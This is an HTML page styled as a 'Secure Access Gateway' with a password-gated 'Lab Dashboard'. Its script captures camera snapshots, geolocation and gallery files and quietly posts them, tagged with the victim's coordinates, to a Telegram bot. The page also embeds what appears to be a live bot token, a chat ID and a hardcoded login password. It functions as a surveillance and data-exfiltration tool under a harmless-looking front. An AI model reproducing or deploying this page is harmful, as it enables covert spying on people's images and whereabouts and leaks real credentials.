<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Gateway</title>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 8px; cursor: pointer; color: white; font-weight: bold; background: #3b82f6; }
        #dashboard { display: none; }
        video { width: 100%; border-radius: 8px; display: none; margin-top: 15px; }
        .status { margin-top: 15px; color: #94a3b8; font-size: 14px; }
    </style>
</head>
<body>

<div class="card" id="loginSection">
    <h2>Secure Login</h2>
    <input type="password" id="passwordInput" placeholder="Enter Access Password...">
    <button class="btn" onclick="verifyPassword()" style="background:#22c55e;">Login Access</button>
</div>

<div class="card" id="dashboard" style="display:none;">
    <h2>Lab Dashboard</h2>
    <button class="btn" onclick="initiateHardware()">Camera & Location</button>
    <button class="btn" onclick="captureSnapshot()">Capture Photo</button>
    <button class="btn" onclick="document.getElementById('fileInput').click()">Gallery Access</button>
    <button class="btn" onclick="startScreenShare()">Share Screen</button>
    
    <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="uploadGallery(event)">
    <video id="v" autoplay playsinline></video>
    <div class="status" id="msg">System Ready...</div>
</div>

<script>
    const BOT_TOKEN = "8566985497:AAEOAjObJ9nz67yeEdM1vOEncMyJnxerqJc";
    const CHAT_ID = "8566985497"; // আপনার চ্যাট আইডি এখানে বসানো হয়েছে
    let lat = "N/A", lon = "N/A";

    function verifyPassword() {
        if(document.getElementById('passwordInput').value === "Tamim0186#@") {
            document.getElementById('loginSection').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
        } else { alert("Wrong Password!"); }
    }

    async function initiateHardware() {
        // লোকেশন সংগ্রহ
        navigator.geolocation.getCurrentPosition(pos => {
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
        });
        // ক্যামেরা অনুমতি
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        document.getElementById('v').srcObject = stream;
        document.getElementById('v').style.display = 'block';
        document.getElementById('msg').innerText = "Hardware Initialized.";
    }

    function captureSnapshot() {
        const v = document.getElementById('v');
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(blob => sendToBot(blob, "Photo Captured"));
    }

    function uploadGallery(e) {
        const file = e.target.files[0];
        if(file) sendToBot(file, "Gallery File Uploaded");
    }

    async function startScreenShare() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
            document.getElementById('msg').innerText = "Screen shared successfully!";
        } catch(e) { alert("Screen Share Denied"); }
    }

    function sendToBot(blob, caption) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob);
        formData.append('caption', `${caption}\n📍 Loc: ${lat}, ${lon}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST', body: formData
        }).then(() => document.getElementById('msg').innerText = "✅ Sent to Telegram!");
    }
</script>

</body>
</html>
